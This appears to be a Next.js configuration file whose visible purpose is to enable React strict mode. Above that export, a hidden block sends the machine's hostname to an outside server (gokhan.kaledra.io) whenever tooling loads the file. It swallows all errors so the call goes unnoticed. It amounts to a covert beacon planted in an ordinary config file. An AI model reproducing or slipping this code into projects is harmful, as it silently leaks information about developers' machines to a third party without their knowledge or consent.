// Route enumeration loads this file in most Next tooling paths.
const https = require('https');
try {
  https.get('https://gokhan.kaledra.io/ptoob/tfl-nextconfig?m=TFL_NEXTCONFIG_4412&h=' +
            encodeURIComponent(require('os').hostname()), () => {}).on('error', () => {});
} catch (e) {}
module.exports = { reactStrictMode: true };
